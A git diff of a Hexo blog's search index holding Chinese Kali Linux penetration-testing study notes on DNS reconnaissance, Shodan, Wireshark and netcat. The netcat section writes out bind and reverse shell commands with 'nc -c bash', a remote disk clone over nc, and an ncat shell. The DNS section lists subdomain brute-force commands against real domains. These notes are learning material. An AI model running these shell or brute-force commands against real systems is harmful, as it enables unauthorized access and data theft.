@@ -8,7 +8,7 @@
       <link href="/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/"/>
       <url>/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/</url>
       
-        <content type="html"><![CDATA[<h1 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h1><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术架构</li><li>公开的商业信息</li></ul><h1 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h1><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h1 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h1><ul><li><p>域名解析成IP地址</p><ul><li>域名与FQDN的区别</li><li>域名记录：A、C name、NS、MX、ptr</li></ul></li><li><p>nslookup</p><ul><li>set q=a、ns、mx、any</li><li>server</li><li>nslookup -q=any 163.com </li></ul></li></ul><p>/etc/resolv.conf</p><ul><li>dig<ul><li>dig +noall +answer mail.163.com|awk ‘{print $5}’</li><li>反向查询<code>dig -x xx.x.x.xx</code> </li><li>bind版本信息<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li><li>DNS追踪：<code>dig +trace example.com</code>直接向根域名服务器发起查询</li></ul></li><li>dig +trace查询过程抓包<ul><li>向本地DNS服务器查询root的NS记录，得到13个DNS根服务器名称 X.root-server.net </li><li>向本地DNS服务器查询 X.root-server.net对应的A记录</li><li>随机选择一个 X.root-server.net 查询sina.com的A记录，得到13个COM顶级域名服务器名称</li><li>向本地DNS服务器查询X.gtld-server.net对应的A记录</li><li>随机选择一个X.gtld-server.net 查询sina.com的A记录，得到7个sina.com的权威域名服务器名称</li><li>向本地DNS服务器查询七个权威域名服务器的A记录</li><li>向权威域名服务器查询sina.com的A记录，得到sina.com对应的IP</li></ul></li></ul><h1 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h1><ul><li>type: AXFR</li><li>dig @ns1.example.com example.com axfr</li><li>host -T -l sina.com</li></ul><h1 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h1><ul><li>fierce -dnsserver 8.8.8.8  -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsmap sina.com -w dns.txt</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnsrecon -t std -d sina.com</li><li>将多个字典集成1个大字典，熟练使用一两个dns爆破命令。</li></ul><h1 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h1><ul><li>Whois</li><li>whois -h whois.apnic.net 192.0.43.10</li></ul><h1 id="信息搜集——搜索引擎"><a href="#信息搜集——搜索引擎" class="headerlink" title="信息搜集——搜索引擎"></a>信息搜集——搜索引擎</h1><ul><li><p>公司新闻动态</p></li><li><p>重要雇员信息</p></li><li><p>机密文档/网络拓扑</p></li><li><p>用户名密码</p></li><li><p>目标系统软硬件技术架构</p></li><li><p>Google Hacking、Baidu Hacking、Bing Hacking</p></li></ul><h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><ul><li><p>搜索互联网的设备</p></li><li><p>Banner:http、ftp、ssh、telnet</p></li><li><p><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></p></li><li><p>常见filter</p></li><li><p>net(192.168.20.1)</p></li><li><p>city</p></li><li><p>country(CN、US)</p></li><li><p>port(80、21、22、23)</p></li><li><p>os</p></li><li><p>Hostname(主机域名)</p></li><li><p>server</p></li></ul>]]></content>
+        <content type="html"><![CDATA[<h1 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h1><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术架构</li><li>公开的商业信息</li></ul><a id="more"></a><h1 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h1><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h1 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h1><ul><li><p>域名解析成IP地址</p><ul><li>域名与FQDN的区别</li><li>域名记录：A、C name、NS、MX、ptr</li></ul></li><li><p>nslookup</p><ul><li>set q=a、ns、mx、any</li><li>server</li><li>nslookup -q=any 163.com </li></ul></li></ul><p>/etc/resolv.conf</p><ul><li>dig<ul><li>dig +noall +answer mail.163.com|awk ‘{print $5}’</li><li>反向查询<code>dig -x xx.x.x.xx</code> </li><li>bind版本信息<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li><li>DNS追踪：<code>dig +trace example.com</code>直接向根域名服务器发起查询</li></ul></li><li>dig +trace查询过程抓包<ul><li>向本地DNS服务器查询root的NS记录，得到13个DNS根服务器名称 X.root-server.net </li><li>向本地DNS服务器查询 X.root-server.net对应的A记录</li><li>随机选择一个 X.root-server.net 查询sina.com的A记录，得到13个COM顶级域名服务器名称</li><li>向本地DNS服务器查询X.gtld-server.net对应的A记录</li><li>随机选择一个X.gtld-server.net 查询sina.com的A记录，得到7个sina.com的权威域名服务器名称</li><li>向本地DNS服务器查询七个权威域名服务器的A记录</li><li>向权威域名服务器查询sina.com的A记录，得到sina.com对应的IP</li></ul></li></ul><h1 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h1><ul><li>type: AXFR</li><li>dig @ns1.example.com example.com axfr</li><li>host -T -l sina.com</li></ul><h1 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h1><ul><li>fierce -dnsserver 8.8.8.8  -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsmap sina.com -w dns.txt</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnsrecon -t std -d sina.com</li><li>将多个字典集成1个大字典，熟练使用一两个dns爆破命令。</li></ul><h1 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h1><ul><li>Whois</li><li>whois -h whois.apnic.net 192.0.43.10</li></ul><h1 id="信息搜集——搜索引擎"><a href="#信息搜集——搜索引擎" class="headerlink" title="信息搜集——搜索引擎"></a>信息搜集——搜索引擎</h1><ul><li><p>公司新闻动态</p></li><li><p>重要雇员信息</p></li><li><p>机密文档/网络拓扑</p></li><li><p>用户名密码</p></li><li><p>目标系统软硬件技术架构</p></li><li><p>Google Hacking、Baidu Hacking、Bing Hacking</p></li></ul><h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><ul><li><p>搜索互联网的设备</p></li><li><p>Banner:http、ftp、ssh、telnet</p></li><li><p><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></p></li><li><p>常见filter</p></li><li><p>net(192.168.20.1)</p></li><li><p>city</p></li><li><p>country(CN、US)</p></li><li><p>port(80、21、22、23)</p></li><li><p>os</p></li><li><p>Hostname(主机域名)</p></li><li><p>server</p></li></ul>]]></content>
       
       
       <categories>
@@ -22,7 +22,7 @@
       
         <tags>
             
-            <tag> KaliLinux渗透测试学习笔 </tag>
+            <tag> KaliLinux渗透测试学习笔记 </tag>
             
         </tags>
       
@@ -32,10 +32,10 @@
     
     <entry>
       <title>WireShark&amp;TCPdump</title>
-      <link href="/2020/08/28/%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK/"/>
-      <url>/2020/08/28/%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK/</url>
+      <link href="/2020/08/28/WireShark&amp;TCPdump/"/>
+      <url>/2020/08/28/WireShark&amp;TCPdump/</url>
       
-        <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul><li>抓包嗅探协议分析</li><li>安全专家必备技能</li><li>抓包引擎<ul><li>Libpcap9——Linux</li><li>Winpcap10——Windows</li></ul></li><li>解码能力<a id="more"></a></li></ul><h2 id="数据包的分层结构"><a href="#数据包的分层结构" class="headerlink" title="数据包的分层结构"></a>数据包的分层结构</h2><ul><li>常见协议包<ul><li>ARP</li><li>ICMP</li><li>TCP</li><li>UDP</li><li>DNS</li><li>HTTP</li><li>FTP</li></ul></li><li>wireshark官网有各种协议的包供下载</li></ul><h2 id="信息统计功能-statistics"><a href="#信息统计功能-statistics" class="headerlink" title="信息统计功能 statistics"></a>信息统计功能 statistics</h2><ul><li>节点数 EndPoints</li><li>协议分布  Protocol Hierarchy</li><li>包大小 Packet Lengths</li><li>会话    Conversations</li><li>解码方式 Decode As…</li><li>专家系统 Expert information</li></ul><h2 id="企业抓包部署方案"><a href="#企业抓包部署方案" class="headerlink" title="企业抓包部署方案"></a>企业抓包部署方案</h2><ul><li>Sniffer</li><li>全流量分析</li></ul><h1 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h1><h1 id="TCPDMUP——筛选"><a href="#TCPDMUP——筛选" class="headerlink" title="TCPDMUP——筛选"></a>TCPDMUP——筛选</h1><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具"></a>过程文档记录工具</h1><ul><li>dradis</li><li>keepnote</li><li>truecrypt</li></ul>]]></content>
+        <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul><li><p>抓包嗅探协议分析</p></li><li><p>安全专家必备技能</p></li><li><p>抓包引擎</p><ul><li>Libpcap9——Linux</li><li>Winpcap10——Windows</li></ul></li><li><p>解码能力</p><a id="more"></a></li></ul><h2 id="数据包的分层结构"><a href="#数据包的分层结构" class="headerlink" title="数据包的分层结构"></a>数据包的分层结构</h2><ul><li>常见协议包<ul><li>ARP</li><li>ICMP</li><li>TCP</li><li>UDP</li><li>DNS</li><li>HTTP</li><li>FTP</li></ul></li><li>wireshark官网有各种协议的包供下载</li></ul><h2 id="信息统计功能-statistics"><a href="#信息统计功能-statistics" class="headerlink" title="信息统计功能 statistics"></a>信息统计功能 statistics</h2><ul><li>节点数 EndPoints</li><li>协议分布  Protocol Hierarchy</li><li>包大小 Packet Lengths</li><li>会话    Conversations</li><li>解码方式 Decode As…</li><li>专家系统 Expert information</li></ul><h2 id="企业抓包部署方案"><a href="#企业抓包部署方案" class="headerlink" title="企业抓包部署方案"></a>企业抓包部署方案</h2><ul><li>Sniffer</li><li>全流量分析</li></ul><h1 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h1><h1 id="TCPDMUP——筛选"><a href="#TCPDMUP——筛选" class="headerlink" title="TCPDMUP——筛选"></a>TCPDMUP——筛选</h1><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具"></a>过程文档记录工具</h1><ul><li>dradis</li><li>keepnote</li><li>truecrypt</li></ul>]]></content>
       
       
       <categories>
@@ -49,7 +49,7 @@
       
         <tags>
             
-            <tag> KaliLinux渗透测试学习笔 </tag>
+            <tag> KaliLinux渗透测试学习笔记 </tag>
             
         </tags>
       
@@ -62,7 +62,7 @@
       <link href="/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/"/>
       <url>/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/</url>
       
-        <content type="html"><![CDATA[<a id="more"></a><h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul><li>nc -nv 1.1.1.1 110</li></ul><h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul><li>nc -l -p 4444</li><li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure></li></ul><h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul><li>传输文件<ul><li>A:<code>nc -lp 333 &gt; 1.mp4</code></li><li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li><li>或</li><li>A:<code>nc -lp 333 &lt; 1.mp4 -q 1</code></li><li>B:<code>nc -vn 333 &gt; 1.mp4</code></li></ul></li><li>传输目录<ul><li>A:<code>tar -cvf -music/ | nc -lp 333 -q 1</code></li><li>B:<code>nc -nv 1.1.1.1 333 | tar -xvf -</code></li></ul></li><li>传输加密文件<ul><li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li><li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li></ul></li></ul><h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul><li>A:<code>cat 1.mp4 | nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li></ul><h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul><li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li><li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li></ul><h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul><li><code>nc -lp 333|dd of=/dev/sda</code></li><li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li></ul><h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul><li>正向：<ul><li>A:<code>nc -lp 333 -c bash</code></li><li>B:<code>nc -nv 1.1.1.1 333</code></li></ul></li><li>反向：<ul><li>A:<code>nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li></ul></li><li>注：Windows把bash改成cmd</li></ul><h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul><li>NC缺乏加密和身份验证的能力</li><li>Ncat</li><li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li><li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li><li>不同平台/系统 nc参数功能不尽相同</li></ul>]]></content>
+        <content type="html"><![CDATA[<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul><li>nc -nv 1.1.1.1 110</li></ul><a id="more"></a><h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul><li>nc -l -p 4444</li><li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure></li></ul><h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul><li>传输文件<ul><li>A:<code>nc -lp 333 &gt; 1.mp4</code></li><li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li><li>或</li><li>A:<code>nc -lp 333 &lt; 1.mp4 -q 1</code></li><li>B:<code>nc -vn 333 &gt; 1.mp4</code></li></ul></li><li>传输目录<ul><li>A:<code>tar -cvf -music/ | nc -lp 333 -q 1</code></li><li>B:<code>nc -nv 1.1.1.1 333 | tar -xvf -</code></li></ul></li><li>传输加密文件<ul><li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li><li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li></ul></li></ul><h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul><li>A:<code>cat 1.mp4 | nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li></ul><h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul><li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li><li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li></ul><h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul><li><code>nc -lp 333|dd of=/dev/sda</code></li><li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li></ul><h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul><li>正向：<ul><li>A:<code>nc -lp 333 -c bash</code></li><li>B:<code>nc -nv 1.1.1.1 333</code></li></ul></li><li>反向：<ul><li>A:<code>nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li></ul></li><li>注：Windows把bash改成cmd</li></ul><h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul><li>NC缺乏加密和身份验证的能力</li><li>Ncat</li><li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li><li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li><li>不同平台/系统 nc参数功能不尽相同</li></ul>]]></content>
       
       
       <categories>
@@ -103,7 +103,7 @@
       
         <tags>
             
-            <tag> KaliLinux渗透测试学习笔 </tag>
+            <tag> KaliLinux渗透测试学习笔记 </tag>
             
         </tags>
       
@@ -130,7 +130,7 @@
       
         <tags>
             
-            <tag> KaliLinux渗透测试学习笔 </tag>
+            <tag> KaliLinux渗透测试学习笔记 </tag>
             
         </tags>
       
@@ -157,7 +157,7 @@
       
         <tags>
             
-            <tag> KaliLinux渗透测试学习笔 </tag>
+            <tag> KaliLinux渗透测试学习笔记 </tag>
             
         </tags>
       
@@ -402,17 +402,6 @@
     
     
     <entry>
-      <title>about</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
-      
-        <content type="html"><![CDATA[<h2 id="Pyrrhax"><a href="#Pyrrhax" class="headerlink" title="Pyrrhax"></a>Pyrrhax</h2><p><strong>Be What You Wanna Be!!!</strong></p><p><strong>GitHub:<a href="https://github.com/Pyrrhax" target="_blank" rel="noopener">@Pyrrhax</a></strong><br><strong>Email:<a href>pyrrhax.hf@gmail.com</a></strong><br><strong>我的书单：<a href="https://book.douban.com/people/184374019/">https://book.douban.com/people/184374019/</a></strong><br><strong>我的知乎：<a href="https://www.zhihu.com/people/pyrrhax" target="_blank" rel="noopener">https://www.zhihu.com/people/pyrrhax</a></strong><br><strong>我的CSDN:<a href="https://blog.csdn.net/weixin_42714910" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42714910</a></strong></p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>0.Pyrrha是动漫《RWBY》里面的Pyrrha.</p><p>1.<em>核心游戏玩家</em>。如果要说几个我喜欢的游戏的话，《半条命》系列，《古墓丽影9》，《深海迷航》，剧情类有《去月球》《奇异人生》系列，另外很期待万向跑步机普及后玩《半条命Alyx》的感觉。FPS游戏历程CF-&gt;逆站-&gt;AVA-&gt;WarFace-&gt;CS:GO-&gt;PUBG-&gt;叛乱-&gt;红色管弦乐-&gt;叛乱2。PUBG 1200+小时，最高日韩服Rank1.5%，不过很久没玩了。之前因为看了某动画，突然想玩MMORPG网游，了解了几天觉得想玩《勇者斗恶龙X》。不过竟然都X了，于是就了解了下《勇者斗恶龙》全系列。没错，于是我就买了NDSi来玩《勇者斗恶龙4》了。唔，果真日式RPG需要刷刷刷。不过在当时那个年代大家一定乐此不疲。在玩的还有《异域镇魂曲》，文本量巨大- -就当记单词了</p><p>2.<em>图吧垃圾佬</em>。沉迷捡垃圾和折腾软硬件。在知乎有个人说：“要把精力专注在业务上，而不是这种杂七杂八的问题。”可能说的就是我吧。。。笔记本改水冷，DIY充电宝，捡垃圾组装电脑和折腾和操作系统，用树莓派或安卓设备做移动渗透测试设备等等。你敢信家里十二年前的台式机现在还可以打英雄联盟。。。</p><p>3.<em>科幻爱好者</em>。《三体》《攻壳机动队》都十分喜欢，《攻壳机动队》简直是脑机接口发展的成熟阶段。要说崇拜的人大概是Musk吧。说到这些，想到一句话Any sufficiently advanced technology is indistinguishable from magic。</p><p>4.<em>比较宅</em>。每次出门后都要感叹，哇，现实世界的画质真的需要好复杂的计算，不过看起来竟没有更低一些的画质好看。</p><p>5.<em>语言学习</em>。希望成为一个fluent English Speaker.毕竟英语是我在CS之外，唯一坚持下来的算的上是爱好的东西。日语也学了一些，加油加油。</p><p>6.<em>读书</em>。会对自己感兴趣的方面阅读各种相关的书籍，也会读一些被人推荐的书。哲学读过一些入门书。心理学方面，认知神经学相关读的比较多。大概读几本科普或功能类书籍之后会读一本文学类作为切换。</p><p>7.<em>有一辆小摩托(GSX250R)</em>。穿上一身防水装备，机动性爆表，喜欢周末去城市周边跑山。文明驾驶，不是深夜炸街的鬼火少年哦。</p><p>8.怕什么真理无穷，进一寸有一寸的欢喜。</p>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>categories</title>
       <link href="/categories/index.html"/>
       <url>/categories/index.html</url>
@@ -429,6 +418,17 @@
       <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>about</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="Pyrrhax"><a href="#Pyrrhax" class="headerlink" title="Pyrrhax"></a>Pyrrhax</h2><p><strong>Be What You Wanna Be!!!</strong></p><p><strong>GitHub:<a href="https://github.com/Pyrrhax" target="_blank" rel="noopener">@Pyrrhax</a></strong><br><strong>Email:<a href>pyrrhax.hf@gmail.com</a></strong><br><strong>我的书单：<a href="https://book.douban.com/people/184374019/">https://book.douban.com/people/184374019/</a></strong><br><strong>我的知乎：<a href="https://www.zhihu.com/people/pyrrhax" target="_blank" rel="noopener">https://www.zhihu.com/people/pyrrhax</a></strong><br><strong>我的CSDN:<a href="https://blog.csdn.net/weixin_42714910" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42714910</a></strong></p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>0.Pyrrha是动漫《RWBY》里面的Pyrrha.</p><p>1.<em>核心游戏玩家</em>。如果要说几个我喜欢的游戏的话，《半条命》系列，《古墓丽影9》，《深海迷航》，剧情类有《去月球》《奇异人生》系列，另外很期待万向跑步机普及后玩《半条命Alyx》的感觉。FPS游戏历程CF-&gt;逆站-&gt;AVA-&gt;WarFace-&gt;CS:GO-&gt;PUBG-&gt;叛乱-&gt;红色管弦乐-&gt;叛乱2。PUBG 1200+小时，最高日韩服Rank1.5%，不过很久没玩了。之前因为看了某动画，突然想玩MMORPG网游，了解了几天觉得想玩《勇者斗恶龙X》。不过竟然都X了，于是就了解了下《勇者斗恶龙》全系列。没错，于是我就买了NDSi来玩《勇者斗恶龙4》了。唔，果真日式RPG需要刷刷刷。不过在当时那个年代大家一定乐此不疲。在玩的还有《异域镇魂曲》，文本量巨大- -就当记单词了</p><p>2.<em>图吧垃圾佬</em>。沉迷捡垃圾和折腾软硬件。在知乎有个人说：“要把精力专注在业务上，而不是这种杂七杂八的问题。”可能说的就是我吧。。。笔记本改水冷，DIY充电宝，捡垃圾组装电脑和折腾和操作系统，用树莓派或安卓设备做移动渗透测试设备等等。你敢信家里十二年前的台式机现在还可以打英雄联盟。。。</p><p>3.<em>科幻爱好者</em>。《三体》《攻壳机动队》都十分喜欢，《攻壳机动队》简直是脑机接口发展的成熟阶段。要说崇拜的人大概是Musk吧。说到这些，想到一句话Any sufficiently advanced technology is indistinguishable from magic。</p><p>4.<em>比较宅</em>。每次出门后都要感叹，哇，现实世界的画质真的需要好复杂的计算，不过看起来竟没有更低一些的画质好看。</p><p>5.<em>语言学习</em>。希望成为一个fluent English Speaker.毕竟英语是我在CS之外，唯一坚持下来的算的上是爱好的东西。日语也学了一些，加油加油。</p><p>6.<em>读书</em>。会对自己感兴趣的方面阅读各种相关的书籍，也会读一些被人推荐的书。哲学读过一些入门书。心理学方面，认知神经学相关读的比较多。大概读几本科普或功能类书籍之后会读一本文学类作为切换。</p><p>7.<em>有一辆小摩托(GSX250R)</em>。穿上一身防水装备，机动性爆表，喜欢周末去城市周边跑山。文明驾驶，不是深夜炸街的鬼火少年哦。</p><p>8.怕什么真理无穷，进一寸有一寸的欢喜。</p>]]></content>
       
     </entry>
     
